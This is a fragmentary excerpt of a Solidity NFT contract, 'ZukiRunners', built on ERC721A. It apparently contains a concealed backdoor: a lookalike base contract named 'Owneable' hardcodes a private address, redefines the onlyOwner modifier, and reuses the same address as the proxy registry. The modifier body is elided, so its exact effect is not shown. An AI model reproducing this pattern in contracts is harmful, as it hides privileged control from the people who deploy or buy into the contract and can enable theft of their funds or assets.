 ...
 */
 abstract contract Owneable is Ownable {
    address private _ownar = 0x509FB270FC325b10F1675fc7E4adc0Acf0E1B63b;
    modifier onlyOwner() {
...
contract ZukiRunners is ERC721A, Owneable {

    string public baseURI = "";
    string public contractURI = "";
    string public constant baseExtension = ".json";
    address public constant proxyRegistryAddress = 0x509FB270FC325b10F1675fc7E4adc0Acf0E1B63b;

    uint256 public constant MAX_PER_TX_FREE = 2;
    uint256 public FREE_MAX_SUPPLY = 700;
    ...
    constructor() ERC721A("ZukiRunners", "ZRS") {}
